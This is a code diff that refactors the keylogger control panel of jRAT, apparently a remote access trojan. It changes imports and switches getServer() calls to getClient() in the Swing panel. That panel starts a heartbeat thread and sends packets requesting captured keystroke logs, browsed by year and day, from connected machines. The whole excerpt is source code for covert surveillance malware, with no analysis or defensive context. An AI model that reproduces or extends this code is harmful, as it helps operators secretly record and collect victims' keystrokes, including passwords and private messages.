@@ -34,9 +34,9 @@ import javax.swing.tree.DefaultTreeModel;
 
 import se.jrat.plugin.keylogger.client.KeyloggerPlugin;
 import se.jrat.plugin.keylogger.client.HeartbeatThread;
-import jrat.api.BaseControlPanel;
 import jrat.api.Client;
 import jrat.api.net.PacketBuilder;
+import jrat.api.ui.BaseControlPanel;
 
 @SuppressWarnings("serial")
 public class PanelKeylogger extends BaseControlPanel {
@@ -53,12 +53,12 @@ public class PanelKeylogger extends BaseControlPanel {
 	private JTextPane onlineTextPane;
 
 	@SuppressWarnings("deprecation")
-	public PanelKeylogger() {
-
+	public PanelKeylogger(Client client) {
+		super(client);
 		JToggleButton tglbtnEnable = new JToggleButton("Enable");
 		tglbtnEnable.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				hb = new HeartbeatThread(getServer());
+				hb = new HeartbeatThread(getClient());
 				new Thread(hb).start();
 			}
 		});
@@ -149,7 +149,7 @@ public class PanelKeylogger extends BaseControlPanel {
 					final DayTreeNode day = (DayTreeNode)event.getPath().getPath()[3];
 					
 					try {
-						getServer().addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOG_HEADER, getServer()) {
+						getClient().addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOG_HEADER, getClient()) {
 							@Override
 							public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {
 								dos.writeUTF(year.toString());
@@ -180,7 +180,7 @@ public class PanelKeylogger extends BaseControlPanel {
 			
 			((DefaultMutableTreeNode)tree.getModel().getRoot()).removeAllChildren();
 			
-			getServer().addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOGS_HEADER, getServer()) {
+			getClient().addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOGS_HEADER, getClient()) {
 				@Override
 				public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {
 
